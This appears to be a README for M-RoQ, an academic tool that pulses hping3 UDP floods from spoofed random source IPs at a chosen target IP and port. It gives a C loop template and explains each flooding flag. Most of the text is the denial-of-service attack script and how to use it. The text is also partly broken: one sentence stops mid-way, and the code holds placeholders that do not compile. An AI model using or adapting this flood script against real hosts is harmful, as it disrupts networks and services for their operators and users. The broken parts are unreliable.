# M-RoQ software

The M-RoQ (Manipulated-RoQ) software was developed to manipulates the flooding of the Hping3 software. The aim is that the      

#include <stdio.h><br>
#include <string.h><br>
#include <stdlib.h><br>
#include <time.h><br>
#include <unistd.h><br>
<br>
main()<br>
{<br>
&nbsp;&nbsp;&nbsp;while(<time in seconds>)<br>
	{<br>
		system("timeout <time in miliseconds> hping3 --rand-source --flood -2 <dst IP> -p <dst PORT> -d <packet lenght> &");<br>
		usleep(<time in miliseconds>);<br>
        	time in seconds++;<br>
	}<br>
    	system("killall -9 hping3");<br>
}<br>

Where <time in seconds> represents the total time that RoQ attack will act. The timeout command represents the total time in miliseconds that the attack traffic will punish the victim. The hping3 is the flooding DDoS software that will generate the traffic. The --rand-source is the option related to the IP manipulation. the --flood option is related the huge amount o data traffic to sent. the -2 option means that the message sent is UDP. The <dst IP> and <dst PORT> options means the IP target and PORT targe, respectively. The <packet lenght> option means the lenght of the packet sent.<br>
<br>
Finally, the system("killall -9 hping3") command kills the hping3 software to stop the traffic process.<br> 
<br>
Authors:<br>
Vinícius de Miranda Rios<br>
Pedro R. M. Inácio<br>
Damien Magoni<br>
Mário M. Freire<br>
